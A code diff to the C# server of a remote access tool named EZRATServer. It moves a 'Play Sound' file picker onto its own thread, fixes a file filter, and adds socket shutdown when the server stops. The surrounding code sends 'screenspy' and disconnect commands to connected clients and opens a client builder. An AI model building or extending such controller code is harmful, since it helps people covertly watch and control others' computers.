@@ -298,7 +298,7 @@ namespace EZRATServer
             (this.imageContextMenu1.Items[10] as ToolStripMenuItem).DropDownItemClicked += RightClickSelect;
             (this.imageContextMenu1.Items[9] as ToolStripMenuItem).DropDownItemClicked += RightClickSelect;
         }
-        private void BuilderClient(object sende4r,EventArgs e)
+        private void BuilderClient(object sende4r, EventArgs e)
         {
             ClientBuilder cb = new ClientBuilder();
             cb.Show();
@@ -362,13 +362,9 @@ namespace EZRATServer
                     SendCommand("screenspy;", GetIdClient());
                     break;
                 case "Play Sound":
-                    OpenFileDialog opf = new OpenFileDialog();
-                    opf.Multiselect = false;
-                    opf.Filter = "*.wav| Wav files";
-                    if (opf.ShowDialog() == DialogResult.OK)
-                    {
-                        UploadFile(opf.FileName);
-                    }
+                    Thread tmp = new Thread(() => { UploadFile(SoundSearch()); });
+                    tmp.SetApartmentState(ApartmentState.STA);
+                    tmp.Start();
                     break;
                 case "Close":
                     SendCommand("dc", GetIdClient());
@@ -381,6 +377,21 @@ namespace EZRATServer
             }
         }
 
+
+        private string SoundSearch()
+        {
+            OpenFileDialog opf = new OpenFileDialog();
+            opf.Multiselect = false;
+            opf.Filter = "Wav files | *.wav";
+            if (opf.ShowDialog() == DialogResult.OK)
+            {
+                return opf.FileName;
+            }
+            else
+            {
+                return null;
+            }
+        }
 
         void CloseProgram(object sender, EventArgs e)
         {
@@ -408,6 +419,7 @@ namespace EZRATServer
         void StopServer(object sender, EventArgs e)
         {
             this.lblStatus.Text = "Server stoped";
+            DisconnectSocketServer();
             CloseAllSockets();
         }
 
@@ -430,6 +442,15 @@ namespace EZRATServer
             _serverSocket.Listen(5); //Listen for incoming connections
             _serverSocket.BeginAccept(AcceptCallback, null); //Define the client accept callback
             IsStartedServer = true;
+        }
+
+        private void DisconnectSocketServer()
+        {
+            if (_isServerStarted)
+            {
+                _serverSocket.Close();
+                _serverSocket.Dispose();
+            }
         }
 
         /// <summary>
